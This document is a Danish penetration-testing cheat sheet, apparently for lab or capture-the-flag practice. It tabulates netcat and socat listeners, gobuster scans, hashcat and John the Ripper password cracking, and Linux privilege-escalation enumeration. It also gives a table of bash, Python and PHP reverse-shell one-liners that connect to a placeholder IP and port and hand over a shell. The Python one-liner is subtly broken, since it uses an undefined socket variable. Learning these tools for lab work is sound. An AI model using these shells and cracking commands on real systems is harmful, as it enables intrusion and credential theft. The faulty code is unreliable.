## Reverse Shell & Netværksforbindelser

| Kommando           | Beskrivelse                                                 | Vigtige Flags                                                     |
|--------------------|-------------------------------------------------------------|-------------------------------------------------------------------|
| `nc -lvnp 443`     | Starter en Netcat-lytter på port 443 (typisk til reverse shell). | `-l`: Lytter efter indgående forbindelser.<br>`-v`: Verbose (viser detaljer).<br>`-n`: Ingen DNS-opslag.<br>`-p`: Angiver specifik port. |
| `rlwrap [kommando]`| Tilføjer readline-funktionalitet (historik, autocomplete) til terminalprogrammer. | Ingen essentielle flags.<br>Eksempelbrug: `rlwrap nc -lvnp 443` |
| `ncat [host] [port]`| Forbedret udgave af Netcat med bl.a. SSL-understøttelse og avancerede features. | `-l`: Lytter.<br>`-v`: Verbose.<br>`--ssl`: Bruger SSL-forbindelse.<br>`-e [program]`: Udfører program/shell ved forbindelse (typisk til reverse shells). |
| `socat [parametre]`| Avanceret værktøj til netværksoperationer, tunneling og shells. | Eksempel reverse shell:<br>`socat TCP-L:[port] -` (lyt)<br>`socat TCP:[ip]:[port] EXEC:/bin/bash` (connect til remote shell). |

## Web Enumeration & Brute Force

| Kommando | Beskrivelse | Vigtige Flags |
|----------|-------------|---------------|
| `gobuster --help` | Viser hjælp og alle muligheder i Gobuster. | Ingen flags nødvendige |
| `gobuster dir -u "http://www.example.thm" -w /path/to/wordlist` | Scanner URL for skjulte mapper/filer (directory brute-force). | `dir`: Directory scan-mode.<br>`-u`: URL til målet.<br>`-w`: Angiver sti til wordlist. |
| `gobuster dir -u "http://www.example.thm" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r` | Directory scanning med udvidet wordlist og følger redirects (omdirigeringer). | `-r`: Følg HTTP redirects.<br>`-w`: Wordlist-sti. |
| `gobuster vhost -u "http://MACHINE_IP" --domain example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320` | Scanner efter virtuelle hosts/subdomæner på målet. | `vhost`: Virtual host scan-mode.<br>`--domain`: Angiver hoveddomænet.<br>`--append-domain`: Tilføjer domænet til resultaterne.<br>`--exclude-length`: Ekskluderer svar af bestemt længde (fx fejlmeldinger). |

## Password Cracking

| Kommando | Beskrivelse | Vigtige Flags |
|----------|-------------|---------------|
| `hashcat` | Password-cracking værktøj, understøtter mange algoritmer og angrebsmetoder. | `-m`: Hash-algoritme (f.eks. `-m 3200` er bcrypt).<br>`-a`: Angrebsmodus (f.eks. `0` dictionary attack, `3` brute force). |
| `hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt` | Bruger Hashcat med dictionary-angreb på hashes af typen bcrypt. | `-m 3200`: bcrypt hashes.<br>`-a 0`: Dictionary-angreb (ordliste).<br>`hash.txt`: Fil med hash-værdier.<br>`rockyou.txt`: Standard ordliste til password cracking. |
| `john hash.txt` | Simpelt password cracking med John the Ripper. | Ingen flags (simpel cracking). |
| `john --wordlist=/path/to/wordlist.txt hash.txt` | Dictionary-angreb med ordliste. | `--wordlist`: Angiver ordliste (dictionary attack). |
| `john --format=bcrypt hash.txt` | Password cracking med specifik algoritme (bcrypt). | `--format`: Angiver hash-algoritme (f.eks. bcrypt, md5, sha256). |
| `john --show hash.txt` | Viser crackede passwords fra John the Ripper. | `--show`: Vis crackede passwords. |

## Reverse Shell Eksempler

| Reverse Shell Eksempler | Beskrivelse |
|-------------------------|-------------|
| `bash -i >& /dev/tcp/<ip>/<port> 0>&1` | Enkel bash reverse shell |
| `python3 -c 'import socket,subprocess,os;socket.socket(socket.AF_INET,socket.SOCK_STREAM).connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` | Python reverse shell (lang version) |
| `php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&1");'` | PHP reverse shell |

## Linux Enumeration & Privilege Escalation

| Kommando | Beskrivelse |
|----------|-------------|
| `uname -a` | Systeminfo (OS, kerneversion). |
| `cat /etc/issue` | OS distribution info. |
| `cat /etc/passwd` | Systembrugere. |
| `sudo -l` | Kommandoer med sudo-rettigheder. |
| `id` | Bruger-ID og grupper. |
| `crontab -l` | Brugerens cronjobs. |
| `cat /etc/crontab` | Systemets cronjobs. |
| `find / -perm -4000 2>/dev/null` | Filer med SUID-bit (privilege escalation). |
| `cat /etc/sudoers` | Sudo-konfiguration. |

## Filhåndtering

| Kommando | Beskrivelse | Nyttige flags |
|----------|-------------|---------------|
| `ls` | Lister filer og mapper | `-l`: detaljeret visning<br>`-a`: vis skjulte filer |
| `pwd` | Viser nuværende mappe | Ingen flags |
| `cd <mappe>` | Skifter mappe | Brug `..` for op |
| `cat <fil>` | Viser filindhold | Ingen flags |
| `nano <fil>` | Teksteditor | Ingen flags |
| `touch <fil>` | Opretter tom fil | Ingen flags |
| `mkdir <mappe>` | Opret mappe | `-p` opret mellemmapper |
| `rm <fil>` | Sletter fil | `-r`: rekursivt<br>`-f`: tving sletning |
| `cp <fra> <til>` | Kopier filer/mapper | `-r`: kopierer mapper |
| `mv <fra> <til>` | Flyt eller omdøb | Ingen flags |
| `grep <søgetekst> <fil>` | Søg efter tekst | `-i`: ignore case<br>`-r`: rekursiv |
| `chmod <rettigheder> <fil>` | Filrettigheder | `+x`: eksekverbar |
| `chown <bruger>:<gruppe> <fil>` | Ændrer ejer | Ingen nødvendige |
| `scp <fil> bruger@host:/sti` | Filoverførsel via SSH | Ingen nødvendige |
